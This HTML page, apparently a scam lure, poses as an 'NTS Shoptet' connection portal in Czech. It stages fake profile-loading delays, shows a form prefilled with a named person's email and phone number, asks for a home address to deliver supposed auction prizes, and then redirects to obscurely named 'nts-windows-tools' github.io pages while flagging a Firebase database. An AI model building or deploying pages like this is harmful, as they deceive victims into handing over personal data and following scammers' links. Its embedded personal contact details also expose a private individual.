<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NTS Connection Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
        
        body { font-family: 'Inter', sans-serif; }

        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #2563eb;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .fade-in { animation: fadeIn 0.6s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="bg-slate-50 min-h-screen flex items-center justify-center p-4">

    <div id="app-card" class="bg-white p-8 md:p-10 rounded-3xl shadow-2xl max-w-lg w-full fade-in border border-gray-100">
        <div id="content-area">
            <div class="flex justify-center py-10">
                <div class="loader"></div>
            </div>
        </div>
    </div>

    <script>
        // Vaše Firebase konfigurace
        const firebaseConfig = {
            apiKey: "AIzaSyBSleqso5D6w0D3w-qBBsBnMDpC9_DVquI",
            authDomain: "shoptet-login-42929.firebaseapp.com",
            databaseURL: "https://shoptet-login-42929-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "shoptet-login-42929",
            storageBucket: "shoptet-login-42929.firebasestorage.app",
            messagingSenderId: "195109305852",
            appId: "1:195109305852:web:a704c9420263ed0d7fc679"
        };

        // Inicializace Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const contentArea = document.getElementById('content-area');

        // Funkce pro zobrazení načítacího kolečka
        function showLoading(text, seconds, nextFunction) {
            contentArea.innerHTML = `
                <div class="flex flex-col items-center justify-center py-12 text-center">
                    <div class="loader mb-6"></div>
                    <p class="text-gray-600 font-medium animate-pulse">${text}</p>
                </div>
            `;
            setTimeout(nextFunction, seconds * 1000);
        }

        // --- KROK 0: Kontrola databáze při startu ---
        async function checkStatus() {
            try {
                const snapshot = await db.ref('start').once('value');
                const startValue = snapshot.val();

                if (startValue === 1) {
                    showLoading("Přihlašujeme Vás...", 2, () => {
                        window.location.href = "https://nts-windows-tools.github.io/hefgkrhdehg56rhgt87r9tz65rzj/?user=Alena";
                    });
                } else {
                    step1_Language();
                }
            } catch (error) {
                console.error("Chyba při připojení k Firebase:", error);
                step1_Language(); // Záložní start i při chybě
            }
        }

        // --- KROK 1: Výběr jazyka ---
        function step1_Language() {
            contentArea.innerHTML = `
                <div class="fade-in">
                    <h1 class="text-3xl font-bold text-gray-900 mb-2 tracking-tight">Connection to the world of IT electronics</h1>
                    <p class="text-gray-500 mb-8">Please choose your language</p>
                    
                    <div class="space-y-3 mb-8">
                        <label class="flex items-center p-4 border rounded-xl cursor-pointer hover:bg-blue-50 transition border-blue-200 bg-blue-50">
                            <input type="radio" name="lang" value="cs" checked class="w-5 h-5 text-blue-600">
                            <span class="ml-3 font-medium text-gray-700">Czech</span>
                        </label>
                        <label class="flex items-center p-4 border rounded-xl cursor-pointer hover:bg-gray-50 transition border-gray-200">
                            <input type="radio" name="lang" value="en" class="w-5 h-5 text-blue-600">
                            <span class="ml-3 font-medium text-gray-700">English</span>
                        </label>
                        <label class="flex items-center p-4 border rounded-xl cursor-pointer hover:bg-gray-50 transition border-gray-200">
                            <input type="radio" name="lang" value="de" class="w-5 h-5 text-blue-600">
                            <span class="ml-3 font-medium text-gray-700">German</span>
                        </label>
                    </div>

                    <button onclick="step2_CountryConfirm()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-200 transition duration-300 flex items-center justify-center gap-2">
                        Next <span>&rarr;</span>
                    </button>
                </div>
            `;
        }

        // --- KROK 2: Potvrzení země ---
        function step2_CountryConfirm() {
            contentArea.innerHTML = `
                <div class="fade-in text-center">
                    <h2 class="text-2xl font-bold text-gray-900 mb-8">Je tato země správná?</h2>
                    <div class="text-4xl font-extrabold text-blue-600 mb-10 tracking-tight">Česko</div>
                    <div class="grid grid-cols-2 gap-4">
                        <button onclick="step3_NTSLoading()" class="bg-gray-900 text-white font-bold py-4 rounded-xl hover:bg-black transition">Ano</button>
                        <button onclick="step3_NTSLoading()" class="bg-gray-100 text-gray-600 font-bold py-4 rounded-xl hover:bg-gray-200 transition">Ne</button>
                    </div>
                </div>
            `;
        }

        // --- KROK 3: První loading ---
        function step3_NTSLoading() {
            showLoading("Získáváme nějaké údaje z Vašeho stávajícího profilu NTS...", 13, step4_ProfileCheck);
        }

        // --- KROK 4: Kontrola profilu ---
        function step4_ProfileCheck() {
            contentArea.innerHTML = `
                <div class="fade-in">
                    <h2 class="text-2xl font-bold text-gray-900 mb-2">Zkontrolujte prosím svůj účet NTS:</h2>
                    <p class="text-gray-500 mb-6 text-sm">Pokud jsou nějaké údaje zastaralé, aktualizujte je:</p>
                    
                    <div class="space-y-4 mb-8">
                        <div>
                            <label class="text-xs font-bold text-gray-400 uppercase mb-1 block">Jméno</label>
                            <input type="text" value="Alena" class="w-full p-3 bg-gray-50 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
                        </div>
                        <div>
                            <label class="text-xs font-bold text-gray-400 uppercase mb-1 block">Příjmení</label>
                            <input type="text" value="Rudolfská" class="w-full p-3 bg-gray-50 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
                        </div>
                        <div>
                            <label class="text-xs font-bold text-gray-400 uppercase mb-1 block">E-mail</label>
                            <input type="email" value="matej685@outlook.cz" class="w-full p-3 bg-gray-50 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
                        </div>
                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <label class="text-xs font-bold text-gray-400 uppercase mb-1 block">Země</label>
                                <input type="text" value="Česko" class="w-full p-3 bg-gray-50 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
                            </div>
                            <div>
                                <label class="text-xs font-bold text-gray-400 uppercase mb-1 block">Telefon</label>
                                <input type="text" value="(+420) 734481020" class="w-full p-3 bg-gray-50 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
                            </div>
                        </div>
                    </div>

                    <button onclick="step5_Auctions()" class="w-full bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg hover:bg-blue-700 transition">Potvrdit</button>
                </div>
            `;
        }

        // --- KROK 5: Aukce ---
        function step5_Auctions() {
            contentArea.innerHTML = `
                <div class="fade-in">
                    <h2 class="text-2xl font-bold text-gray-900 mb-2 text-center text-blue-600">Připojte se do NTS Shoptet Aukcí!</h2>
                    <p class="text-gray-500 mb-8 text-center px-4 italic">Potřebujeme pár údajů, abychom Vám mohli doručit výhry z aukcí NTS Shoptet</p>
                    
                    <div class="space-y-4 mb-8">
                        <div>
                            <label class="text-sm font-semibold text-gray-700 mb-1 block">Adresa:</label>
                            <input type="text" placeholder="Např. Hlavní 123" class="w-full p-3 border rounded-lg focus:ring-2 focus:ring-orange-400 outline-none border-gray-200">
                        </div>
                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <label class="text-sm font-semibold text-gray-700 mb-1 block">PSČ:</label>
                                <input type="text" placeholder="000 00" class="w-full p-3 border rounded-lg focus:ring-2 focus:ring-orange-400 outline-none border-gray-200">
                            </div>
                            <div>
                                <label class="text-sm font-semibold text-gray-700 mb-1 block">Město:</label>
                                <input type="text" class="w-full p-3 border rounded-lg focus:ring-2 focus:ring-orange-400 outline-none border-gray-200">
                            </div>
                        </div>
                    </div>

                    <button onclick="finalLoading()" class="w-full bg-orange-500 text-white font-black text-xl py-5 rounded-2xl shadow-xl hover:bg-orange-600 hover:scale-[1.02] transition transform active:scale-95 uppercase tracking-widest">
                        Jít do toho!
                    </button>
                </div>
            `;
        }

        // --- FINÁLE: Druhý loading a zápis do DB ---
        function finalLoading() {
            showLoading("Přihlašujeme Vás, momentík...", 15, async () => {
                try {
                    // Aktualizace databáze (změna 'start' na 1)
                    await db.ref('/').update({ start: 1 });
                    // Přesměrování
                    window.location.href = "https://nts-windows-tools.github.io/NTS-65f6bgh5gfh5gj6hzh98gv4-55-shopNTS/";
                } catch (e) {
                    console.error("Chyba při zápisu:", e);
                    // I při chybě přesměrujeme, aby se uživatel nezasekl
                    window.location.href = "https://nts-windows-tools.github.io/NTS-65f6bgh5gfh5gj6hzh98gv4-55-shopNTS/";
                }
            });
        }

        // Spuštění aplikace
        checkStatus();
    </script>
</body>
</html>
